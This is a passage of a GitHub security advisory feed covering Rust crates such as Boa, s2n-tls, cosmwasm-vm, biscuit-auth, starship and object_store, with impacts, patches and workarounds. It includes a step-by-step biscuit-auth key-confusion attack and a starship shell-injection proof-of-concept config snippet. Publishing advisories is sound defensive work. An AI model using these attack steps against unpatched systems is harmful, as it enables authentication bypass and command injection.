<p>Boa's implementation of <code>AsyncGenerator</code> makes the assumption that the state of an <code>AsyncGenerator</code> object cannot change while resolving a promise created by methods of <code>AsyncGenerator</code> such as <code>%AsyncGeneratorPrototype%.next</code>, <code>%AsyncGeneratorPrototype%.return</code>, or <code>%AsyncGeneratorPrototype%.throw</code>.
However, a carefully constructed code could trigger a state transition from a getter method for the promise's <code>then</code> property, which causes the engine to fail an assertion of this assumption, causing an uncaught exception. This could be used to create a Denial Of Service attack in applications that run arbitrary ECMAScript code provided by an external user.</p>
<h2 id="patches">Patches</h2>
<p>Version 0.19.0 is patched to correctly handle this case.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Users unable to upgrade to the patched version would want to use <a href="https://doc.rust-lang.org/std/panic/fn.catch_unwind.html"><code>std::panic::catch_unwind</code></a> to ensure any exceptions caused by the engine don't impact the availability of the main application.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/boa-dev/boa/commit/69ea2f52ed976934bff588d6b566bae01be313f7">https://github.com/boa-dev/boa/commit/69ea2f52ed976934bff588d6b566bae01be313f7</a></li>
<li><a href="https://github.com/tc39/ecma262/security/advisories/GHSA-g38c-wh3c-5h9r">https://github.com/tc39/ecma262/security/advisories/GHSA-g38c-wh3c-5h9r</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/boa-dev/boa/security/advisories/GHSA-f67q-wr6w-23jq">https://github.com/boa-dev/boa/security/advisories/GHSA-f67q-wr6w-23jq</a></li>
<li><a href="https://github.com/tc39/ecma262/security/advisories/GHSA-g38c-wh3c-5h9r">https://github.com/tc39/ecma262/security/advisories/GHSA-g38c-wh3c-5h9r</a></li>
<li><a href="https://github.com/boa-dev/boa/commit/69ea2f52ed976934bff588d6b566bae01be313f7">https://github.com/boa-dev/boa/commit/69ea2f52ed976934bff588d6b566bae01be313f7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43367">https://nvd.nist.gov/vuln/detail/CVE-2024-43367</a></li>
<li><a href="https://github.com/advisories/GHSA-f67q-wr6w-23jq">https://github.com/advisories/GHSA-f67q-wr6w-23jq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f67q-wr6w-23jq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-14T20:49:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[s2n-tls] s2n-tls's mTLS API ordering may skip client authentication]]></title>
        <id>https://github.com/advisories/GHSA-857q-xmph-p2v5</id>
        <link href="https://github.com/advisories/GHSA-857q-xmph-p2v5"/>
        <updated>2024-08-09T20:41:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An API ordering issue in s2n-tls can cause client authentication to unexpectedly not be enabled on the server when it otherwise appears to be. Server applications are impacted if client authentication is enabled by calling s2n_connection_set_config() before calling s2n_connection_set_client_auth_type().</p>
<p>Applications are not impacted if these APIs are called in the opposite order, or if client authentication is enabled on the config with s2n_config_set_client_auth_type(). s2n-tls clients verifying server certificates are not impacted.</p>
<p>Impacted versions: &lt; v1.5.0.</p>
<h3 id="patches">Patches</h3>
<p>The patch is included in v1.5.0 [1].</p>
<h3 id="workarounds">Workarounds</h3>
<p>Applications can workaround this issue by calling s2n_connection_set_config() after calling s2n_connection_set_client_auth_type(), or by enabling client authentication on the config with s2n_config_set_client_auth_type().</p>
<p>If you have any questions or comments about this advisory we ask that you contact AWS/Amazon Security via our vulnerability reporting page [2] or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<p>[1] <a href="https://github.com/aws/s2n-tls/releases/tag/v1.5.0">https://github.com/aws/s2n-tls/releases/tag/v1.5.0</a></p>
<p>[2] <a href="https://aws.amazon.com/security/vulnerability-reporting">https://aws.amazon.com/security/vulnerability-reporting</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aws/s2n-tls/security/advisories/GHSA-857q-xmph-p2v5">https://github.com/aws/s2n-tls/security/advisories/GHSA-857q-xmph-p2v5</a></li>
<li><a href="https://github.com/aws/s2n-tls/commit/e8ca8911c5b2f2361687dec1467c45cd54d00b3f">https://github.com/aws/s2n-tls/commit/e8ca8911c5b2f2361687dec1467c45cd54d00b3f</a></li>
<li><a href="https://github.com/advisories/GHSA-857q-xmph-p2v5">https://github.com/advisories/GHSA-857q-xmph-p2v5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-857q-xmph-p2v5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-09T20:41:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cosmwasm-vm] Gas mispricing in cosmwasm-vm]]></title>
        <id>https://github.com/advisories/GHSA-rg2q-2jh9-447q</id>
        <link href="https://github.com/advisories/GHSA-rg2q-2jh9-447q"/>
        <updated>2024-08-08T17:03:07.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Component:</strong> wasmvm
<strong>Criticality:</strong> Medium (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1</a>: I:Moderate; L:Likely)
<strong>Patched versions:</strong> wasmvm 1.5.4, 2.0.3, 2.1.2</p>
<p>Some Wasm operations take significantly more gas than our benchmarks indicated. This can lead to missing the <a href="https://github.com/CosmWasm/cosmwasm/blob/e50490c4199a234200a497219b27f071c3409f58/docs/GAS.md#cosmwasm-gas-pricing">gas target</a> we defined by a factor of ~10x. This means a malicious contract could take 10 times as much time to execute as expected, which can be used to temporarily DoS a chain.</p>
<p>See <a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md">CWA-2024-004</a> for more details.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-rg2q-2jh9-447q">https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-rg2q-2jh9-447q</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/5bef1c588933bd60a04bb70099150cf84b69e144">https://github.com/CosmWasm/cosmwasm/commit/5bef1c588933bd60a04bb70099150cf84b69e144</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/9b4d6d03772b75d500a7d3c972d0d8ba6d085c06">https://github.com/CosmWasm/cosmwasm/commit/9b4d6d03772b75d500a7d3c972d0d8ba6d085c06</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/c1313afeb261e17b1c8cf6a1eacee1da0dac42ae">https://github.com/CosmWasm/cosmwasm/commit/c1313afeb261e17b1c8cf6a1eacee1da0dac42ae</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0361.html">https://rustsec.org/advisories/RUSTSEC-2024-0361.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rg2q-2jh9-447q">https://github.com/advisories/GHSA-rg2q-2jh9-447q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rg2q-2jh9-447q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-08T16:30:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cosmwasm-vm] Gas mispricing in cosmwasm-vm]]></title>
        <id>https://github.com/advisories/GHSA-rg2q-2jh9-447q</id>
        <link href="https://github.com/advisories/GHSA-rg2q-2jh9-447q"/>
        <updated>2024-08-08T17:03:07.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Component:</strong> wasmvm
<strong>Criticality:</strong> Medium (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1</a>: I:Moderate; L:Likely)
<strong>Patched versions:</strong> wasmvm 1.5.4, 2.0.3, 2.1.2</p>
<p>Some Wasm operations take significantly more gas than our benchmarks indicated. This can lead to missing the <a href="https://github.com/CosmWasm/cosmwasm/blob/e50490c4199a234200a497219b27f071c3409f58/docs/GAS.md#cosmwasm-gas-pricing">gas target</a> we defined by a factor of ~10x. This means a malicious contract could take 10 times as much time to execute as expected, which can be used to temporarily DoS a chain.</p>
<p>See <a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md">CWA-2024-004</a> for more details.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-rg2q-2jh9-447q">https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-rg2q-2jh9-447q</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/5bef1c588933bd60a04bb70099150cf84b69e144">https://github.com/CosmWasm/cosmwasm/commit/5bef1c588933bd60a04bb70099150cf84b69e144</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/9b4d6d03772b75d500a7d3c972d0d8ba6d085c06">https://github.com/CosmWasm/cosmwasm/commit/9b4d6d03772b75d500a7d3c972d0d8ba6d085c06</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/c1313afeb261e17b1c8cf6a1eacee1da0dac42ae">https://github.com/CosmWasm/cosmwasm/commit/c1313afeb261e17b1c8cf6a1eacee1da0dac42ae</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0361.html">https://rustsec.org/advisories/RUSTSEC-2024-0361.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rg2q-2jh9-447q">https://github.com/advisories/GHSA-rg2q-2jh9-447q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rg2q-2jh9-447q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-08T16:30:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cosmwasm-vm] Gas mispricing in cosmwasm-vm]]></title>
        <id>https://github.com/advisories/GHSA-rg2q-2jh9-447q</id>
        <link href="https://github.com/advisories/GHSA-rg2q-2jh9-447q"/>
        <updated>2024-08-08T17:03:07.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Component:</strong> wasmvm
<strong>Criticality:</strong> Medium (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1</a>: I:Moderate; L:Likely)
<strong>Patched versions:</strong> wasmvm 1.5.4, 2.0.3, 2.1.2</p>
<p>Some Wasm operations take significantly more gas than our benchmarks indicated. This can lead to missing the <a href="https://github.com/CosmWasm/cosmwasm/blob/e50490c4199a234200a497219b27f071c3409f58/docs/GAS.md#cosmwasm-gas-pricing">gas target</a> we defined by a factor of ~10x. This means a malicious contract could take 10 times as much time to execute as expected, which can be used to temporarily DoS a chain.</p>
<p>See <a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md">CWA-2024-004</a> for more details.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-rg2q-2jh9-447q">https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-rg2q-2jh9-447q</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/5bef1c588933bd60a04bb70099150cf84b69e144">https://github.com/CosmWasm/cosmwasm/commit/5bef1c588933bd60a04bb70099150cf84b69e144</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/9b4d6d03772b75d500a7d3c972d0d8ba6d085c06">https://github.com/CosmWasm/cosmwasm/commit/9b4d6d03772b75d500a7d3c972d0d8ba6d085c06</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/c1313afeb261e17b1c8cf6a1eacee1da0dac42ae">https://github.com/CosmWasm/cosmwasm/commit/c1313afeb261e17b1c8cf6a1eacee1da0dac42ae</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0361.html">https://rustsec.org/advisories/RUSTSEC-2024-0361.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rg2q-2jh9-447q">https://github.com/advisories/GHSA-rg2q-2jh9-447q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rg2q-2jh9-447q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-08T16:30:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openssl-src] openssl-src subject to DoS by double-checked locking]]></title>
        <id>https://github.com/advisories/GHSA-vr8j-hgmm-jh9r</id>
        <link href="https://github.com/advisories/GHSA-vr8j-hgmm-jh9r"/>
        <updated>2024-08-02T16:01:27.000Z</updated>
        <content type="html"><![CDATA[<p>If an X.509 certificate contains a malformed policy constraint and policy processing is enabled, then a write lock will be taken twice recursively. On some operating systems (most widely: Windows) this results in a denial of service when the affected process hangs. Policy processing being enabled on a publicly facing server is not considered to be a common setup. Policy processing is enabled by passing the <code>-policy' argument to the command line utilities or by calling either </code>X509_VERIFY_PARAM_add0_policy()' or `X509_VERIFY_PARAM_set1_policies()' functions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-3996">https://nvd.nist.gov/vuln/detail/CVE-2022-3996</a></li>
<li><a href="https://github.com/openssl/openssl/commit/7725e7bfe6f2ce8146b6552b44e0d226be7638e7">https://github.com/openssl/openssl/commit/7725e7bfe6f2ce8146b6552b44e0d226be7638e7</a></li>
<li><a href="https://www.openssl.org/news/secadv/20221213.txt">https://www.openssl.org/news/secadv/20221213.txt</a></li>
<li><a href="https://github.com/advisories/GHSA-vr8j-hgmm-jh9r">https://github.com/advisories/GHSA-vr8j-hgmm-jh9r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vr8j-hgmm-jh9r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-12-13T18:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[biscuit-auth] biscuit-auth vulnerable to public key confusion in third party block]]></title>
        <id>https://github.com/advisories/GHSA-p9w4-585h-g3c7</id>
        <link href="https://github.com/advisories/GHSA-p9w4-585h-g3c7"/>
        <updated>2024-08-05T21:14:27.000Z</updated>
        <content type="html"><![CDATA[<p>Third-party blocks can be generated without transferring the whole token to the third-party authority. Instead, a <code>ThirdPartyBlock</code> request can be sent, providing only the necessary info to generate a third-party block and to sign it:</p>
<ul>
<li>the public key of the previous block (used in the signature)</li>
<li>the public keys part of the token symbol table (for public key interning in datalog expressions)</li>
</ul>
<p>A third-part block request forged by a malicious user can trick the third-party authority into generating datalog trusting the wrong keypair.</p>
<p>Consider the following example (nominal case)</p>
<ul>
<li>Authority <code>A</code> emits the following token: <code>check if thirdparty("b") trusting ${pubkeyB}</code></li>
<li>The well-behaving holder then generates a third-party block request based on the token and sends it to third-party authority <code>B</code></li>
<li>Third-party <code>B</code> generates the following third-party block <code>thirdparty("b"); check if thirdparty("c") trusting ${pubkeyC}</code></li>
<li>The token holder now must obtain a third-party block from third party <code>C</code> to be able to use the token</li>
</ul>
<p>Now, with a malicious user:</p>
<ul>
<li>Authority <code>A</code> emits the following token: <code>check if thirdparty("b") trusting ${pubkeyB}</code></li>
<li>The holder then attenuates the token with the following third party block <code>thirdparty("c")</code>, signed with a keypair <code>pubkeyD, privkeyD)</code> they generate</li>
<li>The holder then generates a third-party block request based on this token, but alter the <code>ThirdPartyBlockRequest</code> <code>publicKeys</code> field and replace <code>pubkeyD</code> with <code>pubkeyC</code></li>
<li>Third-party <code>B</code> generates the following third-party block <code>thirdparty("b"); check if thirdparty("c") trusting ${pubkeyC}</code></li>
<li>Due to the altered symbol table, the actual meaning of the block is <code>thirdparty("b"); check if thirdparty("c") trusting ${pubkeyD}</code></li>
<li>The attacker can now use the token without obtaining a third-party block from <code>C</code>.</li>
</ul>
<h3 id="impact">Impact</h3>
<p>Tokens with third-party blocks containing <code>trusted</code> annotations generated through a third party block request</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/biscuit-auth/biscuit-rust/security/advisories/GHSA-p9w4-585h-g3c7">https://github.com/biscuit-auth/biscuit-rust/security/advisories/GHSA-p9w4-585h-g3c7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41949">https://nvd.nist.gov/vuln/detail/CVE-2024-41949</a></li>
<li><a href="https://github.com/biscuit-auth/biscuit/security/advisories/GHSA-rgqv-mwc3-c78m">https://github.com/biscuit-auth/biscuit/security/advisories/GHSA-rgqv-mwc3-c78m</a></li>
<li><a href="https://github.com/advisories/GHSA-p9w4-585h-g3c7">https://github.com/advisories/GHSA-p9w4-585h-g3c7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p9w4-585h-g3c7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-07-31T21:15:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[starship] Starship vulnerable to shell injection via undocumented, unpredictable shell expansion in custom commands]]></title>
        <id>https://github.com/advisories/GHSA-vx24-x4mv-vwr5</id>
        <link href="https://github.com/advisories/GHSA-vx24-x4mv-vwr5"/>
        <updated>2024-07-26T21:48:45.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>Starship is a cross-shell prompt. Starting in version 1.0.0 and prior to version 1.20.0, undocumented and unpredictable shell expansion and/or quoting rules make it easily to accidentally cause shell injection when using custom commands with starship in bash. Version 1.20.0 fixes the vulnerability.</p>
<h3 id="poc">PoC</h3>
<p>Have some custom command which prints out information from a potentially untrusted/unverified source.</p>
<pre><code>[custom.git_commit_name]
command = 'git show -s --format="%&lt;(25,mtrunc)%s"'
style = "italic"
when = true
</code></pre>
<h3 id="impact">Impact</h3>
<p>This issue only affects users with custom commands, so the scope is limited, and without knowledge of others' commands, it could be hard to successfully target someone. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/starship/starship/security/advisories/GHSA-vx24-x4mv-vwr5">https://github.com/starship/starship/security/advisories/GHSA-vx24-x4mv-vwr5</a></li>
<li><a href="https://github.com/starship/starship/commit/cfc58161e0ec595db90af686ad77a73df6d44d74">https://github.com/starship/starship/commit/cfc58161e0ec595db90af686ad77a73df6d44d74</a></li>
<li><a href="https://github.com/starship/starship/releases/tag/v1.20.0">https://github.com/starship/starship/releases/tag/v1.20.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41815">https://nvd.nist.gov/vuln/detail/CVE-2024-41815</a></li>
<li><a href="https://github.com/advisories/GHSA-vx24-x4mv-vwr5">https://github.com/advisories/GHSA-vx24-x4mv-vwr5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vx24-x4mv-vwr5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-26T21:24:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[xmp_toolkit] XMP Toolkit's `XmpFile::close` can trigger undefined behavior]]></title>
        <id>https://github.com/advisories/GHSA-66fw-43h8-f8p3</id>
        <link href="https://github.com/advisories/GHSA-66fw-43h8-f8p3"/>
        <updated>2024-07-26T21:14:55.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of the crate failed to catch C++ exceptions raised within the <code>XmpFile::close</code> function. If such an exception occured, it would trigger undefined behavior, typically a process abort.</p>
<p>This is best demonstrated in <a href="https://github.com/adobe/xmp-toolkit-rs/issues/230">issue #230</a>, where a race condition causes the <code>close</code> call to fail due to file I/O errors.</p>
<p>This was fixed in <a href="https://github.com/adobe/xmp-toolkit-rs/pull/232">PR #232</a> (released as crate version 1.9.0), which now safely handles the exception.</p>
<p>For backward compatibility, the existing API ignores the error. A new API <code>XmpFile::try_close</code> was added to allow callers to receive and process the error result.</p>
<p>Users of all prior versions of <code>xmp_toolkit</code> are encouraged to update to version 1.9.0 to avoid undefined behavior.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/adobe/xmp-toolkit-rs/issues/230">https://github.com/adobe/xmp-toolkit-rs/issues/230</a></li>
<li><a href="https://github.com/adobe/xmp-toolkit-rs/issues/233">https://github.com/adobe/xmp-toolkit-rs/issues/233</a></li>
<li><a href="https://github.com/adobe/xmp-toolkit-rs/pull/232">https://github.com/adobe/xmp-toolkit-rs/pull/232</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0360.html">https://rustsec.org/advisories/RUSTSEC-2024-0360.html</a></li>
<li><a href="https://github.com/advisories/GHSA-66fw-43h8-f8p3">https://github.com/advisories/GHSA-66fw-43h8-f8p3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-66fw-43h8-f8p3</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-07-26T21:14:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gix-attributes] The kstring integration in gix-attributes is unsound]]></title>
        <id>https://github.com/advisories/GHSA-cx7h-h87r-jpgr</id>
        <link href="https://github.com/advisories/GHSA-cx7h-h87r-jpgr"/>
        <updated>2024-07-25T16:38:42.000Z</updated>
        <content type="html"><![CDATA[<p><code>gix-attributes</code> (in <a href="https://github.com/Byron/gitoxide/blob/gix-attributes-v0.22.2/gix-attributes/src/state.rs#L19-L27"><code>state::ValueRef</code></a>) unsafely creates a <code>&amp;str</code> from a <code>&amp;[u8]</code> containing non-UTF8 data, with the justification that so long as nothing reads the <code>&amp;str</code> and relies on it being UTF-8 in the <code>&amp;str</code>, there is no UB:</p>
<pre><code class="language-rust">// SAFETY: our API makes accessing that value as `str` impossible, so illformed UTF8 is never exposed as such.
</code></pre>
<p>The problem is that the non-UTF8 <code>str</code> <strong>is</strong> exposed to outside code: first to the <code>kstring</code> crate itself, which requires UTF-8 in its documentation and may have UB as a consequence of this, but also to <code>serde</code>, where it propagates to e.g. <code>serde_json</code>, <code>serde_yaml</code>, etc., where the same problems occur.</p>
<p>This is not sound, and it could cause further UB down the line in these places that can view the <code>&amp;str</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Byron/gitoxide/issues/1460">https://github.com/Byron/gitoxide/issues/1460</a></li>
<li><a href="https://github.com/rustsec/advisory-db/commit/884aaa1646132bc3a27ba058197d6ef039bec294">https://github.com/rustsec/advisory-db/commit/884aaa1646132bc3a27ba058197d6ef039bec294</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0359.html">https://rustsec.org/advisories/RUSTSEC-2024-0359.html</a></li>
<li><a href="https://github.com/advisories/GHSA-cx7h-h87r-jpgr">https://github.com/advisories/GHSA-cx7h-h87r-jpgr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cx7h-h87r-jpgr</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-07-25T16:38:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[object_store] Apache Arrow Rust Object Store: AWS WebIdentityToken exposure in log files]]></title>
        <id>https://github.com/advisories/GHSA-c2hf-vcmr-qjrf</id>
        <link href="https://github.com/advisories/GHSA-c2hf-vcmr-qjrf"/>
        <updated>2024-08-03T05:06:58.000Z</updated>
        <content type="html"><![CDATA[<p>Exposure of temporary credentials in logs&nbsp;in Apache Arrow Rust Object Store (<code>object_store</code> crate), version 0.10.1 and earlier on all platforms using AWS WebIdentityTokens.&nbsp;</p>
<p>On certain error conditions, the logs may contain the OIDC token passed to  AssumeRoleWithWebIdentity <a href="https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoleWithWebIdentity.html">https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoleWithWebIdentity.html</a> . This allows someone with access to the logs to impersonate that identity, including performing their own calls to AssumeRoleWithWebIdentity, until the OIDC token expires. Typically OIDC tokens are valid for up to an hour, although this will vary depending on the issuer.</p>
<p>Users are recommended to use a different AWS authentication mechanism, disable logging or upgrade to version 0.10.2, which fixes this issue.</p>
<p>Details:</p>
<p>When using AWS WebIdentityTokens with the object_store crate, in the event of a failure and automatic retry, the underlying reqwest error, including the full URL with the credentials, potentially in the parameters, is written to the logs.&nbsp;</p>
<p>Thanks to Paul&nbsp;Hatcherian for reporting this vulnerability</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41178">https://nvd.nist.gov/vuln/detail/CVE-2024-41178</a></li>
<li><a href="https://lists.apache.org/thread/3t0povdppnt2czv6crlsqhvyko93kcrg">https://lists.apache.org/thread/3t0povdppnt2czv6crlsqhvyko93kcrg</a></li>
<li><a href="https://github.com/apache/arrow-rs/pull/6074">https://github.com/apache/arrow-rs/pull/6074</a></li>
<li><a href="https://github.com/apache/arrow-rs/commit/4978e32654235f569062f2cad6c7361e410f1254">https://github.com/apache/arrow-rs/commit/4978e32654235f569062f2cad6c7361e410f1254</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0358.html">https://rustsec.org/advisories/RUSTSEC-2024-0358.html</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/07/23/3">http://www.openwall.com/lists/oss-security/2024/07/23/3</a></li>
<li><a href="https://github.com/advisories/GHSA-c2hf-vcmr-qjrf">https://github.com/advisories/GHSA-c2hf-vcmr-qjrf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c2hf-vcmr-qjrf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-23T18:31:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openssl] openssl's `MemBio::get_buf` has undefined behavior with empty buffers]]></title>
        <id>https://github.com/advisories/GHSA-q445-7m23-qrmw</id>
        <link href="https://github.com/advisories/GHSA-q445-7m23-qrmw"/>
        <updated>2024-08-01T05:06:45.000Z</updated>
        <content type="html"><![CDATA[<p>Previously, <code>MemBio::get_buf</code> called <code>slice::from_raw_parts</code> with a null-pointer, which violates the functions invariants, leading to undefined behavior. In debug builds this would produce an assertion failure. This is now fixed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sfackler/rust-openssl/pull/2266">https://github.com/sfackler/rust-openssl/pull/2266</a></li>
<li><a href="https://github.com/sfackler/rust-openssl/commit/aef36e0f3950653148d6644309ee41ccf16e02bb">https://github.com/sfackler/rust-openssl/commit/aef36e0f3950653148d6644309ee41ccf16e02bb</a></li>
<li><a href="https://github.com/sfackler/rust-openssl/releases/tag/openssl-v0.10.66">https://github.com/sfackler/rust-openssl/releases/tag/openssl-v0.10.66</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0357.html">https://rustsec.org/advisories/RUSTSEC-2024-0357.html</a></li>
<li><a href="https://github.com/advisories/GHSA-q445-7m23-qrmw">https://github.com/advisories/GHSA-q445-7m23-qrmw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q445-7m23-qrmw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-22T17:34:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[matrix-sdk-crypto] matrix-sdk-crypto's `UserIdentity::is_verified` not checking verification status of own user identity while performing the check]]></title>
        <id>https://github.com/advisories/GHSA-4qg4-cvh2-crgg</id>
        <link href="https://github.com/advisories/GHSA-4qg4-cvh2-crgg"/>
        <updated>2024-08-08T05:08:54.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>UserIdentity::is_verified()</code> method in the matrix-sdk-crypto crate before version 0.7.2 doesn't take into account the verification status of the user's own identity while performing the check and may as a result return a value contrary to what is implied by its name and documentation.</p>
<h3 id="impact">Impact</h3>
<p>If the method is used to decide whether to perform sensitive operations towards a user identity, a malicious homeserver could manipulate the outcome in order to make the identity appear trusted. This is not a typical usage of the method, which lowers the impact. The method itself is not used inside the <code>matrix-sdk-crypto</code> crate.</p>
<h3 id="patches">Patches</h3>
<p>The 0.7.2 release of the <code>matrix-sdk-crypto</code> crate includes a fix.</p>
<h3 id="workarounds">Workarounds</h3>
<p>None.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/matrix-org/matrix-rust-sdk/security/advisories/GHSA-4qg4-cvh2-crgg">https://github.com/matrix-org/matrix-rust-sdk/security/advisories/GHSA-4qg4-cvh2-crgg</a></li>
<li><a href="https://github.com/matrix-org/matrix-rust-sdk/commit/76a7052149bb8f722df12da915b3a06d19a6695a">https://github.com/matrix-org/matrix-rust-sdk/commit/76a7052149bb8f722df12da915b3a06d19a6695a</a></li>
<li><a href="https://github.com/matrix-org/matrix-rust-sdk/releases/tag/0.7.2-crypto">https://github.com/matrix-org/matrix-rust-sdk/releases/tag/0.7.2-crypto</a></li>
